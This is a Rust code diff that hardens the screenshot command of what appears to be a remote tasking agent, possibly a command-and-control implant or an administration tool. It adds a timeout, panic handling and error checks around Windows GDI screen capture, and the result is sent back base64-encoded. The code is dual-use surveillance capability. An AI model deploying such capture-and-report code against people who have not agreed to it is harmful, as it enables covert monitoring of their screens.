@@ -72,22 +72,41 @@ fn handle_ps(task_id: &str, sender: &Sender<AgentMessage>) {
 /// Handle `screenshot` command: capture screen
 ///
 /// Uses Win32 GDI to capture the screen and encodes as PNG.
+/// Wrapped with a 30-second timeout to prevent GDI calls from blocking
+/// the agent indefinitely (e.g. in headless/remote desktop environments).
 fn handle_screenshot(task_id: &str, sender: &Sender<AgentMessage>) {
     #[cfg(windows)]
     {
-        let result = unsafe { capture_screen_to_png() };
-        match result {
-            Ok(png_data) => {
+        use std::sync::mpsc;
+        use std::time::Duration;
+
+        let (tx, rx) = mpsc::channel();
+        let tid = task_id.to_string();
+
+        // Run GDI capture in a dedicated thread with timeout
+        std::thread::spawn(move || {
+            let result = std::panic::catch_unwind(|| unsafe { capture_screen_to_png() });
+            let _ = tx.send(match result {
+                Ok(inner) => inner,
+                Err(_) => Err("screenshot panicked (GDI call failed)".to_string()),
+            });
+        });
+
+        match rx.recv_timeout(Duration::from_secs(30)) {
+            Ok(Ok(png_data)) => {
                 use base64::{engine::general_purpose::STANDARD, Engine as _};
                 let b64 = STANDARD.encode(&png_data);
                 let _ = sender.send(AgentMessage::TaskResult {
-                    task_id: task_id.to_string(),
+                    task_id: tid,
                     success: true,
                     output: b64,
                 });
             }
-            Err(e) => {
-                let _ = sender.send(fail(task_id, format!("screenshot failed: {e}")));
+            Ok(Err(e)) => {
+                let _ = sender.send(fail(&tid, format!("screenshot failed: {e}")));
+            }
+            Err(_timeout) => {
+                let _ = sender.send(fail(&tid, "screenshot timed out after 30s".to_string()));
             }
         }
     }
@@ -114,11 +133,30 @@ unsafe fn capture_screen_to_png() -> Result<Vec<u8>, String> {
     }
 
     let hdc_screen = GetDC(std::ptr::null_mut());
+    if hdc_screen.is_null() {
+        return Err("GetDC failed: no desktop session available".to_string());
+    }
     let hdc_mem = CreateCompatibleDC(hdc_screen);
+    if hdc_mem.is_null() {
+        ReleaseDC(std::ptr::null_mut(), hdc_screen);
+        return Err("CreateCompatibleDC failed".to_string());
+    }
     let hbitmap = CreateCompatibleBitmap(hdc_screen, width, height);
+    if hbitmap.is_null() {
+        DeleteDC(hdc_mem);
+        ReleaseDC(std::ptr::null_mut(), hdc_screen);
+        return Err("CreateCompatibleBitmap failed".to_string());
+    }
     let old_bmp = SelectObject(hdc_mem, hbitmap as *mut _);
 
-    BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY);
+    let copied = BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY);
+    if copied == 0 {
+        SelectObject(hdc_mem, old_bmp);
+        DeleteObject(hbitmap as *mut _);
+        DeleteDC(hdc_mem);
+        ReleaseDC(std::ptr::null_mut(), hdc_screen);
+        return Err("BitBlt failed".to_string());
+    }
 
     let mut bmi: BITMAPINFO = std::mem::zeroed();
     bmi.bmiHeader.biSize = std::mem::size_of::<BITMAPINFOHEADER>() as u32;
@@ -132,7 +170,7 @@ unsafe fn capture_screen_to_png() -> Result<Vec<u8>, String> {
     let buf_size = row_size * height as usize;
     let mut pixels: Vec<u8> = vec![0u8; buf_size];
 
-    GetDIBits(
+    let dib_result = GetDIBits(
         hdc_mem, hbitmap, 0, height as u32,
         pixels.as_mut_ptr() as *mut _,
         &mut bmi, DIB_RGB_COLORS,
@@ -142,6 +180,10 @@ unsafe fn capture_screen_to_png() -> Result<Vec<u8>, String> {
     DeleteObject(hbitmap as *mut _);
     DeleteDC(hdc_mem);
     ReleaseDC(std::ptr::null_mut(), hdc_screen);
+
+    if dib_result == 0 {
+        return Err("GetDIBits failed".to_string());
+    }
 
     // Convert BGRA -> RGBA
     for chunk in pixels.chunks_exact_mut(4) {
